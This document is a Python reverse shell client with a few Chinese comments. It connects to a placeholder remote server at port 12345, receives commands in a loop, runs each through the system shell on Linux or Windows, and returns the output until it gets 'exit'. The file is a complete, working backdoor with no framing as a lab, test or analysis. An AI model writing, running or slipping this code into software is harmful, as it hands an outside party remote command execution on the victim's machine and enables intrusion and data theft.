import socket
import subprocess
import os
import sys

def connect_to_server(server_ip, server_port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((server_ip, server_port))
        print("Connected to server:", server_ip, "port:", server_port)
        return s
    except Exception as e:
        print("Error connecting to server: ", str(e))
        return None

def send_data(sock, data):
    try:
        sock.send(data.encode())
    except Exception as e:
        print("Error sending data: ", str(e))

def receive_data(sock):
    try:
        data = sock.recv(1024).decode()
        return data
    except Exception as e:
        print("Error receiving data: ", str(e))
        return None

def execute_command(command):
    if sys.platform.startswith("linux"):
        # Linux
        if command.startswith("cd"):
            # 处理 cd 命令
            directory = command.split(" ", 1)[1]
            try:
                os.chdir(directory)
                return "Changed directory to: " + os.getcwd()
            except Exception as e:
                return "Failed to change directory. Error: " + str(e)
        else:
            # 执行其他命令
            try:
                output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
                return output
            except subprocess.CalledProcessError as e:
                return "Command execution failed. Error: " + str(e.output)
    elif sys.platform.startswith("win"):
        # Windows
        if command.startswith("cd"):
            # 处理 cd 命令
            directory = command.split(" ", 1)[1]
            try:
                os.chdir(directory)
                return "Changed directory to: " + os.getcwd()
            except Exception as e:
                return "Failed to change directory. Error: " + str(e)
        else:
            # 执行其他命令
            try:
                output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
                return output
            except subprocess.CalledProcessError as e:
                return "Command execution failed. Error: " + str(e.output)
    else:
        return "Unsupported operating system."

def main():
    server_ip = 'xxx.xxx.xxx.xxx'
    server_port = 12345

    sock = connect_to_server(server_ip, server_port)
    if sock is None:
        return

    while True:
        command = receive_data(sock)
        if command == "exit":
            break

        result = execute_command(command)
        send_data(sock, result)

    sock.close()

if __name__ == '__main__':
    main()
